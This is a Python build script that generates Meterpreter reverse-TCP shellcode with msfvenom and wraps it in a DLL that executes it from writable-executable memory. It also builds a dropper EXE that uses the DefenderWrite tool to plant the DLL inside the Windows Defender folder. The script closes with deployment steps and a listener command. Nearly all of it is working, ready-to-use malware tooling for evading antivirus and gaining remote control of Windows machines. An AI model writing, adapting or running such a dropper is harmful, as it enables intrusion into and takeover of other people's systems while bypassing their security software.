#!/usr/bin/env python3
import os
import sys
import subprocess
import argparse
import re

def extract_shellcode_from_c_format(c_output):
    """Extract ALL shellcode bytes from msfvenom C format output"""
    # Extract all hex bytes from the \x format
    hex_matches = re.findall(r'\\x([0-9a-fA-F]{2})', c_output)
    
    if hex_matches:
        print(f"[+] Found {len(hex_matches)} shellcode bytes")
        return [f"0x{byte.upper()}" for byte in hex_matches]
    
    return None

def generate_shellcode(lhost, lport):
    """Generate shellcode using msfvenom and extract properly"""
    print("[+] Generating shellcode with msfvenom...")
    
    try:
        # Use C format which gives us the shellcode in hex format
        result = subprocess.run([
            "msfvenom",
            "-p", "windows/x64/meterpreter_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "c",
            "-b", "\\x00\\x0a\\x0d"  # Avoid bad characters
        ], capture_output=True, text=True, check=True)
        
        output = result.stdout
        print(f"[*] msfvenom output length: {len(output)} characters")
        
        # Extract the shellcode bytes
        shellcode_bytes = extract_shellcode_from_c_format(output)
        
        if not shellcode_bytes:
            print("[-] Failed to extract shellcode bytes from msfvenom output")
            return None
        
        print(f"[+] Successfully extracted {len(shellcode_bytes)} bytes of shellcode")
        
        # Validate shellcode size (meterpreter should be 400-800 bytes typically)
        if len(shellcode_bytes) < 300:
            print(f"[-] Shellcode too small ({len(shellcode_bytes)} bytes), something wrong")
            return None
            
        return shellcode_bytes
        
    except subprocess.CalledProcessError as e:
        print(f"[-] msfvenom failed: {e.stderr}")
        print(f"[*] Trying alternative method...")
        return generate_shellcode_alternative(lhost, lport)

def generate_shellcode_alternative(lhost, lport):
    """Alternative method to generate shellcode"""
    try:
        # Try without bad characters
        result = subprocess.run([
            "msfvenom",
            "-p", "windows/x64/meterpreter_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "c"
        ], capture_output=True, text=True, check=True)
        
        output = result.stdout
        shellcode_bytes = extract_shellcode_from_c_format(output)
        
        if shellcode_bytes and len(shellcode_bytes) > 300:
            return shellcode_bytes
            
    except:
        pass
    
    return None

def check_dependencies():
    """Check if all required tools are available"""
    required_tools = ["msfvenom", "x86_64-w64-mingw32-g++"]
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, "--version"], capture_output=True, check=False)
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
        print("[+] Install with: sudo apt install metasploit-framework mingw-w64")
        return False
    return True

def main():
    parser = argparse.ArgumentParser(description="Build DefenderWrite payload with Metasploit shellcode")
    parser.add_argument("LHOST", help="Listener IP")
    parser.add_argument("LPORT", type=int, help="Listener Port")
    parser.add_argument("-o", "--output", default="payload.exe", help="Output EXE name")
    args = parser.parse_args()

    print(f"[+] Building payload for {args.LHOST}:{args.LPORT}")
    
    # Check dependencies first
    if not check_dependencies():
        sys.exit(1)
    
    # Generate shellcode
    shellcode_bytes = generate_shellcode(args.LHOST, args.LPORT)
    
    if not shellcode_bytes:
        print("[-] Failed to generate valid shellcode. Exiting.")
        sys.exit(1)
    
    # Format the shellcode for the C array (proper formatting)
    formatted_shellcode = ""
    for i in range(0, len(shellcode_bytes), 16):
        formatted_shellcode += "    " + ", ".join(shellcode_bytes[i:i+16]) + ",\n"
    formatted_shellcode = formatted_shellcode.rstrip(",\n")  # Remove trailing comma
    
    print(f"[+] Shellcode formatted into C array ({len(shellcode_bytes)} bytes)")

    # Create DLL source
    dll_name = os.path.splitext(args.output)[0] + ".dll"
    dll_src = f"""#include <windows.h>
#include <string.h>

unsigned char shellcode[] = {{
{formatted_shellcode}
}};

extern "C" __declspec(dllexport) void RunMe(LPCWSTR dummy) {{
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {{
        memcpy(exec, shellcode, sizeof(shellcode));
        ((void(*)())exec)();
    }}
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RunMe, 0, 0, 0);
    }}
    return TRUE;
}}
"""
    with open("payload_dll.cpp", "w") as f:
        f.write(dll_src)

    # Compile DLL with static linking
    print(f"[+] Compiling {dll_name}...")
    try:
        result = subprocess.run([
            "x86_64-w64-mingw32-g++",
            "-shared", "-s", "-O2", 
            "-static", "-static-libgcc", "-static-libstdc++",
            "-o", dll_name,
            "payload_dll.cpp",
            "-lws2_32", "-lwininet"
        ], capture_output=True, text=True, check=True)
        print(f"[+] DLL compiled successfully")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to compile DLL: {e}")
        if e.stderr:
            print(f"[*] Compiler error: {e.stderr}")
        sys.exit(1)

    # Check for DefenderWrite.exe
    if not os.path.exists("DefenderWrite.exe"):
        print("[!] WARNING: DefenderWrite.exe not found in current directory!")
        print("[!] Download it from: https://github.com/TwoSevenOneT/DefenderWrite")
        print("[!] And place it in the same directory as your payload files")

    # Create dropper EXE
    exe_src = f"""#include <windows.h>
#include <shlwapi.h>
#include <string>

int main() {{
    // Extract resources to temp directory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    std::string defenderWritePath = std::string(tempPath) + "\\\\\\\\DefenderWrite.exe";
    std::string dllPath = std::string(tempPath) + "\\\\\\\\{dll_name}";
    
    // Get current executable path
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    std::string currentDir = currentExe;
    currentDir = currentDir.substr(0, currentDir.find_last_of("\\\\\\\\\\\\\\\\"));
    
    std::string sourceDefenderWrite = currentDir + "\\\\\\\\\\\\\\\\DefenderWrite.exe";
    std::string sourceDll = currentDir + "\\\\\\\\\\\\\\\\{dll_name}";
    
    // Copy required files to temp
    if (CopyFileA(sourceDefenderWrite.c_str(), defenderWritePath.c_str(), FALSE)) {{
        OutputDebugStringA("Copied DefenderWrite.exe to temp");
    }}
    
    if (CopyFileA(sourceDll.c_str(), dllPath.c_str(), FALSE)) {{
        OutputDebugStringA("Copied DLL to temp");
    }}
    
    // Build the command
    std::string targetPath = "C:\\\\\\\\\\\\\\\\Program Files\\\\\\\\\\\\\\\\Windows Defender\\\\\\\\\\\\\\\\update.exe";
    std::string command = "\\"" + defenderWritePath + "\\" C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\msiexec.exe \\"" + dllPath + "\\" \\"" + targetPath + "\\" c";
    
    // Execute
    STARTUPINFOA si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    
    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {{
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }}
    
    return 0;
}}
"""
    exe_name = args.output
    with open("dropper.cpp", "w") as f:
        f.write(exe_src)

    # Compile EXE with static linking
    print(f"[+] Compiling {exe_name}...")
    try:
        subprocess.run([
            "x86_64-w64-mingw32-g++",
            "-O2", "-s", "-mwindows",
            "-static", "-static-libgcc", "-static-libstdc++",
            "-o", exe_name,
            "dropper.cpp",
            "-lshlwapi"
        ], check=True)
        print(f"[+] EXE compiled successfully")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to compile EXE: {e}")
        sys.exit(1)

    # Clean up temporary files
    for temp_file in ["payload_dll.cpp", "dropper.cpp"]:
        if os.path.exists(temp_file):
            os.remove(temp_file)



    print(f"\n[+] BUILD SUCCESSFUL!")
    print(f"[+] Files created:")
    print(f"    - {exe_name} (Dropper)")
    print(f"    - {dll_name} (Shellcode DLL - {len(shellcode_bytes)} bytes)")
    print(f"\n[!] IMPORTANT: Download DefenderWrite.exe from GitHub")
    print(f"\n[+] DEPLOYMENT STEPS:")
    print(f"    1. Download DefenderWrite.exe from: https://github.com/TwoSevenOneT/DefenderWrite")
    print(f"    2. On Windows VM, place these 3 files in SAME directory:")
    print(f"       - {exe_name}")
    print(f"       - {dll_name}") 
    print(f"       - DefenderWrite.exe")
    print(f"    3. Start listener: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {args.LHOST}; set LPORT {args.LPORT}; exploit'")
    print(f"    4. Run {exe_name} as Administrator on Windows VM")
    print(f"\n[+] Debugging tips:")
    print(f"    - Check Windows Event Viewer for errors")
    print(f"    - Verify all 3 files are in the same directory")
    print(f"    - Run as Administrator")
    print(f"    - Check if Windows Defender is running")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 defenderdropper.py LHOST LPORT [-o payload.exe]")
        sys.exit(1)
    main()
      
